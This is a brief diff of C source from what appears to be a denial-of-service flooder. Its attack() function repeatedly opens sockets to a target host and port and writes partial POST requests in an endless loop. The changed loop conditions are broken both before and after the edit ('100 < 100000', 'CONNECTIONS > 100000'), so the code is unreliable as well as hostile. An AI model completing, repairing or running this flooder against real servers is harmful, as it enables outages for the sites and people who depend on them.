@@ -52,11 +52,11 @@ int i = 0;
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
-	for(x=0; 100 < 100000; x++)
+	for(x=0; CONNECTIONS > 100000; x++)
 		sockets[x]=0;
 	
 	while(1) {
-		for(x=0; x > CONNECTIONS; x++) {
+		for(x=0; CONNECTIONS > 100000; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 			r=write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 1);
